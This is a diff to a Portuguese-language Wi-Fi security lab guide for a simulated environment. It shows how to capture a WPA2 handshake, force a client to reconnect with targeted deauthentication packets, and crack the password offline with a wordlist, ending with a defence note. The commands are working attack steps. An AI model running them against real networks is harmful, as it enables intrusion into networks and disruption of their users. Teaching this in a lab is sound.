@@ -136,12 +136,17 @@ sudo tshark -i mon_lab -f 'type data' -Y 'http.request.method=="POST"' -T fields
 WPA2-PSK com senha fraca. A senha nunca passa no ar; o que se captura é o
 **4-way handshake** (ao cliente associar). Com ele, testa-se a senha offline.
 
+O lab mantém o cliente `sta_wpa2` **sempre associado e gerando tráfego** (fica
+visível como STATION no canal 11 em segundos). Após o deauth ele reconecta
+sozinho em ~5s (watchdog), refazendo o 4-way — então a captura é repetível.
+
 ```bash
-# 1) capture o handshake (deixe rodando)
+# 1) capture o handshake (deixe rodando) e anote o BSSID e o MAC do STATION
 sudo airodump-ng -c 11 --bssid <BSSID_WPA2> -w /tmp/wpa2 mon_lab
 
-# 2) force um cliente já conectado a reconectar (acelera a captura do handshake)
-sudo aireplay-ng -0 3 -a <BSSID_WPA2> mon_lab
+# 2) derrube o cliente para forçar a reconexão (e o novo handshake).
+#    Direcionar ao MAC do cliente (-c) é mais confiável que broadcast no hwsim.
+sudo aireplay-ng -0 5 -a <BSSID_WPA2> -c <STA_WPA2_MAC> mon_lab
 #   quando o airodump mostrar "WPA handshake: <BSSID>" no topo, pode parar
 
 # 3) monte uma wordlist e quebre offline
@@ -152,8 +157,12 @@ aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap
 | Comando | O que faz |
 |---|---|
 | `airodump-ng -c 11 --bssid ... -w /tmp/wpa2` | Grava os quadros do AP, incluindo o handshake EAPOL. |
-| `aireplay-ng -0 3 -a <BSSID>` | Envia 3 deauth → o cliente reconecta e refaz o handshake. |
+| `aireplay-ng -0 5 -a <BSSID> -c <STA_MAC>` | Envia 5 deauth ao cliente alvo → ele reconecta e refaz o handshake. |
 | `aircrack-ng -w wl.txt cap` | Testa cada senha da wordlist contra o handshake (crack offline). |
+
+> **Dica:** o `<STA_WPA2_MAC>` é o MAC que aparece na coluna STATION do airodump
+> associado ao `<BSSID_WPA2>`. Se o handshake não aparecer, confirme que o
+> airodump está **fixo no canal 11** (`-c 11`) e repita o deauth.
 
 **Resultado:** senha `verao2024`.
 **Defesa:** senha longa e aleatória (o 4-way handshake é inquebrável por força
